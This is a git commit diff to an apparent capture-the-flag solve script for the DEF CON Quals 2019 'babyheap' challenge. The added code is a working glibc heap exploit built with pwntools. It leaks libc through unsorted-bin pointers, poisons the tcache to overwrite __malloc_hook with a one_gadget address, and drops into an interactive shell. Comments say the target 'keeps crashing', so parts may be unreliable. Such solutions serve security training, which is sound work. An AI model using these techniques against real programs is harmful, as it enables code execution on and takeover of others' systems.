129d81ac2fd7cba9edeeed49f7d030a919ba7f31
viethan <vietaing@gmail.com>
2020-06-09 13:51:59 +0000

    added

--- dcquals19_babyheap/solve.py
+++ dcquals19_babyheap/solve.py
@@ -22,7 +22,7 @@ def main():
     def malloc(size, content):
     	r.sendline("M")
     	r.sendline(str(size))
-    	r.send(content)
+    	r.sendline(content)
 
     def free(idx):
     	r.sendline("F")
@@ -34,19 +34,44 @@ def main():
 
     # infoleak
 
-    [malloc(0xf8, "\n") for i in range(7)] # idx 0-6
-    malloc(0xf8, "\n") # idx 7, smallbin
-    malloc(0xf8, "\n") # idx 8
-    malloc(0xf8, "\n") # idx 9, smallbin - to seperate from wilderness
+    [malloc(0xf8, "") for i in range(7)] # idx 0-6
+    malloc(0xf8, "") # idx 7, unsorted bin
+    malloc(0xf8, "") # idx 8
 
     [free(i) for i in range(7)] # free idx 0-6; ; fill tcache binlist
     free(7) # free idx 7, get chunk in unsorted bin
-    free(8)
+    free(8) # free idx 8, consolidate chunk 7 and chunk 8
 
-    [malloc(0xf8, "A"*0xf8 + "\n") for i in range(7)] # idx 0-6
-    gdb.attach(r)
-    malloc(0x8, "A"*0xa + "\n")
-    #malloc(0x8, "A"*0x8 + "\n")
+    [malloc(0xf8, "A"*0xf8) for i in range(7)] # idx 0-6
+    malloc(0x2, "@@@") # idx 7 ; split unsorted chunk, user chunk returned to us will have ptrs to main_arena
+    
+    show(7)
+    r.recvuntil("@")
+    leak = u64("\x00" + r.recvn(5) + "\x00\x00")
+    libc.address = leak - 0x1e4c00
+    one_gadget = libc.address + 0xe2383
+    log.info("libc base address: {}".format(hex(libc.address)))
+    log.info("__malloc_hook address: {}".format(hex(libc.symbols['__malloc_hook']))) 
+    
+    # tcache attack, modifying __malloc_hook
+
+    free(3) 
+    malloc(0xf8, "A" * 0xf8 + "\x81") # idx 0 ; modify size of chunk 1 to 0x181 -> will be putted in another tcache list
+    free(0) 
+    r.sendline("F") # program keeps crashing
+    free(1)
+    r.sendline("F") # program keeps crashing
+    free(2)
+
+    r.sendline("M") # program keeps crashing
+    malloc(0x178, "A" * 0x100 + p64(libc.symbols['__malloc_hook'])[:6]) # idx 2; overflow into chunk 1, change its next pointer
+    
+    malloc(0xf8, "") # idx 1
+    malloc(0xf8, p64(one_gadget)[:6]) # idx 0
+    
+    r.sendline("M")
+    r.sendline(str(0xf8))
+    #gdb.attach(r)
     r.interactive()
 
 
